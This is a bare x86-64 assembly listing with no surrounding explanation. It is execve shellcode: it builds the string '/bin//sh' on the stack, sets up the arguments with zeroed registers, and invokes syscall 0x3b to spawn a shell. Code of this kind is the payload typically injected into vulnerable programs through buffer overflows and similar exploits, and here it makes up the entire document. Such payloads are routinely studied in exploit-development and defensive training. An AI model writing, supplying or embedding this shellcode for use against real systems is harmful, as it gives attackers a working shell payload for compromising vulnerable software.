section .text:
global _start:
_start:
	xor rax, rax
	push rax
	cdq
	xor rsi, rsi
	; hs//nib/
	mov rbx, 0x68732f2f6e69622f
	push rbx
	push rsp
	pop rdi
	mov al, 0x3b
	syscall
